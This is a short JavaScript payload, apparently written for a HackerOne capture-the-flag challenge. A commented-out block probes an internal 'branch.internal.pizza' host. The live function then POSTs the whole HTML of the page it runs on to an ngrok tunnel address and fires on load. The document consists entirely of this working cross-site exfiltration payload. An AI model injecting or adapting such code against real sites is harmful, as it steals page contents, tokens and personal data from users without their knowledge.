
/*fetch("//branch.internal.pizza.hacktivity.h1ctf.com/")
    .then(r => r.text())
    .then(data => leak("info", data))
    .catch(error => leak("error", "error:" + JSON.stringify(error)));*/

function leak(tag, data) {
    fetch("//24d4ecfb5adf.ngrok.io?tag=contents&cb=" + Date.now(), {method: "post", body: document.documentElement.outerHTML})
}

leak();